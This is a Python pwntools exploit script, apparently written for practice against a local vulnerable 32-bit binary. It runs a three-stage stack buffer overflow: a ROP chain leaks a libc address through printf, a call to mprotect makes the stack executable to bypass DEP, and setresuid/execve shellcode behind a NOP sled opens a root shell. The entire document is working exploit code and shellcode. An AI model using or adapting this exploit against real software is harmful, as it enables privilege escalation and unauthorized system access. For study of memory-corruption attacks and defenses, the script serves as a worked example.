#!/usr/bin/python
from pwn import *

offset = 524 
junk = "A" * offset
control_eip = p32(0xdeadbeef)

bin = "/home/tao/shellcode/execve_practice/bof_practice_disable_mprotect_exec_shellcode/bof"
elf = ELF(bin)
rop_elf = ROP(elf)

libc = "/home/tao/shellcode/execve_practice/bof_practice_disable_mprotect_exec_shellcode/libc-2.29.so"
libc_elf = ELF(libc)
rop_libc = ROP(libc_elf)

p = process(bin)

main_prog = p32(0x08049172) #  0x08049172 <+0>:     push   ebp 
printf_plt = elf.plt['printf']
gets_got = elf.got['gets']

log.info('printf@plt : ' + hex(printf_plt))
log.info('gets@got : ' + hex(gets_got))

# 1st STAGE
specifier = p32(0x804a033)  # 0x804a033:      " %s\n"

GAD_leak = ''
GAD_leak += p32(printf_plt)
GAD_leak += main_prog
GAD_leak += specifier
GAD_leak += p32(gets_got)

bof = ''
bof += junk
bof += GAD_leak

p.sendline(bof)

reply = p.recv().strip()
reply = reply[ reply.find('AAA0') + 21 : -4 ]
gets = u32(reply)

print hexdump(reply)
log.success('gets() : ' + hex(gets))

offset = 0x8bca0
mprotect = gets + offset
log.success('mprotect() : ' + hex(mprotect))
log.warn('function() address leaked!')

# 2nd STAGE
stack_start = p32(0xfffdd000)
stack_size = p32(0x21000)
stack_perm = p32(0x7)

GAD_disableMprotect = ''
GAD_disableMprotect += p32(mprotect)
GAD_disableMprotect += main_prog
GAD_disableMprotect += stack_start
GAD_disableMprotect += stack_size
GAD_disableMprotect += stack_perm 

bof = ''
bof += junk
bof += GAD_disableMprotect

p.sendline(bof)
log.warn('DEP disabled!!')

# 3rd STAGE
push_esp = p32(0x08049091) # 0x08049091: push esp ; mov ebx, dword ptr [esp] ; ret

# setresuid(0, 0, 0) ; execve('/bin//sh', ['/bin//sh', NULL], NULL) ; exit(0)
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xd0\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"

nop_sled = '\x90' * 16

bof = ''
bof += junk 
bof += push_esp
bof += nop_sled
bof += shellcode

raw_input(str(p.proc.pid))
p.sendline(bof)

log.success('Popping shell!!')
p.interactive()
